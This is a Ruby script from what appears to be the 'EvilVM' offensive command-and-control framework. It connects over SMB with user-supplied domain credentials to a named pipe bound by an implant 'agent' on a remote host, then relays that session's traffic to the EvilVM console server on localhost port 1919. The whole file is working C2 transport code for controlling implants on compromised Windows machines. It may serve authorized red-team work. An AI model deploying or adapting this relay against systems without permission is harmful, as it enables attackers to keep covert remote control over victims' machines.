#!/usr/bin/env ruby
#
# A simple shim for the SMB named pipe transport.  The agent will 'bind'
# to a named pipe, this program will connect to it, and proxy comms
# through a TCP socket with the main console server.
#
#

require 'time'
require 'pry'
require 'ruby_smb'

def pputs(msg = "", color = 35)
  msg.gsub!("", "\x1b[1m")
  msg.gsub!("", "\x1b[22m")
  puts("\x1b[#{color}m#{msg}\x1b[0m")
end

def domsg(msg, &block)
  begin
    yield
  rescue Exception => e
    pputs("#{Time.now} error: #{msg}", 33)
    exit 3
  end
end

if ARGV.length != 5
  puts()
  puts(" Usage: named-pipe-server.rb <host> <pipe> <domain> <user> <password>")
  puts()
  puts(" This shim connects to an SMB named pipe at the indicated location")
  puts(" and proxies communications with the EvilVM server at localhost:1919")
  puts()
  exit 1
end

($host, $pipename, $domain, $user, $pass) = ARGV

$mutex = Mutex.new

sock = nil
disp = nil
client = nil

domsg("Cannot connect to SMB service") do
  sock = TCPSocket.new($host, 445)
  disp = RubySMB::Dispatcher::Socket.new(sock)
end

domsg("Cannot negotiate SMB") do
  client = RubySMB::Client.new(disp, smb1: false, domain: $domain, username: $user, password: $pass)
  client.negotiate()
end

domsg("Cannot auth / connect to tree; bad creds or permissions?") do
  client.authenticate()
  client.tree_connect("\\\\#{$host}\\IPC$")
end

domsg("Cannot access pipe #{$pipename}, does it exist?") do 
  client.create_pipe("\\#{$pipename}")
end

$pipe = client.last_file

domsg("Unable to connect to EvilVM console server") do
  $server = TCPSocket.new("127.0.0.1", 1919)
end

Thread.new do
  while true
    sent = 0
    $mutex.synchronize do
      available = $pipe.peek_available
      if available > 0
        pputs("#{Time.now.to_s} session received #{available} bytes", 32)
        $server.write($pipe.read(bytes: available))
        sent += 1
      end
    end

    sleep(0.1) if sent == 0
  end
end

while true
  line = $server.recv(512)
  pputs("#{Time.now.to_s} session sending #{line.length} bytes")
  $mutex.synchronize do
    begin
      $pipe.write(data: line)
    rescue Exception => e
      pputs("#{Time.now.to_s} error writing to pipe, exiting...", 33)
      $server.close
      exit 0
    end
  end
end


